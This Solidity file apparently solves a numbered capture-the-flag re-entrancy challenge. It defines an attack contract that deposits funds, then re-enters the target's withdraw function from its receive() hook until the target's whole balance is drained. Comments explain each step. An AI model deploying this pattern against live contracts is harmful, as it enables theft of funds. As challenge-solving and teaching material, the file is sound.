// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./_10_ReEntrancy.sol";

contract ReentranceAttack {
    function attack(address payable reentranceAddess) external payable {
        Reentrance reentrance = Reentrance(reentranceAddess);

        // first deposit some funds
        reentrance.donate.value(msg.value)(address(this));

        // withdraw these funds over and over again because of re-entrancy issue
        callWithdraw(reentranceAddess);
    }

    receive() external payable {
        // re-entrance called by challenge
        callWithdraw(msg.sender);
    }

    function callWithdraw(address payable reentranceAddess) private {
        Reentrance challenge = Reentrance(reentranceAddess);
        uint256 initialDeposit = challenge.balances(address(this));
        // this balance correctly updates after withdraw
        uint256 challengeTotalRemainingBalance = address(challenge).balance;
        // are there more tokens to empty?
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw = initialDeposit < challengeTotalRemainingBalance
                ? initialDeposit
                : challengeTotalRemainingBalance;
            challenge.withdraw(toWithdraw);
        }
    }
}
